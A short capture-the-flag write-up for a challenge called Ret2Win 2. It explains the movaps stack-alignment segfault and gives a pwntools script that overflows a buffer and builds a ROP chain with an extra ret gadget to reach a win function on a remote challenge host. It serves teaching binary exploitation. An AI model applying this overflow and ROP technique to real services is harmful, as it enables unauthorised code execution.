# Ret2Win 2
This challenge is exactly the same as Ret2Win however, the same solution won't work for this challenge.

The reason for this is stack alignment issues. This is generally called the `MOVAPS` issue and happens when you return into a function that calls a GLIBC function which uses the `movaps` operation. When you do this on unaligned data it results in a segfault. The way to fix this is to pad your ROP chain with an extra `ret` gadget before returning into the function you are calling.

So you can use the following `pwntools` script to solve this

```python
from pwn import *

r = remote("ggc.tf", 31338)
binary = ELF("./chal")
payload = b""
payload += b"a" * 18
payload += p64(binary.sym["call_me_to_get_the_flag"] + 161) # Ret gadget
payload += p64(binary.sym["call_me_to_get_the_flag"]) # Function to call
r.sendlineafter(b"Hello, what is your name?", payload)
r.interactive()
```
